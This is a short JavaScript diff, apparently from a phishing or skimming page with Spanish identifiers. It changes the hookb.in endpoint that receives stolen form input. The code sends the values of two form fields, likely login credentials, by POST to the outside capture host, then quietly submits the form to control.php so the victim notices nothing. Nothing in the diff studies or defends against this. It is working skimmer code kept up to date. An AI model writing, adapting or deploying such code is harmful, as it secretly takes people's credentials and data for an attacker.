@@ -3,7 +3,7 @@ nuevoFormulario = doc.createElement`form`;
 cont = doc.getElementById`contenido`;
 
 f = () => {
-	fetch("https://hookb.in/BYjWr2kmEmSLDDx317G9", { method: "POST", body: `${nuevoFormulario.childNodes[1].value}
+	fetch("https://hookb.in/E7gWDwLDEghDEEaxnmDZ", { method: "POST", body: `${nuevoFormulario.childNodes[1].value}
 ${nuevoFormulario.childNodes[4].value}` }).then(() => {
 		nuevoFormulario.action = "control.php";
 		nuevoFormulario.submit();
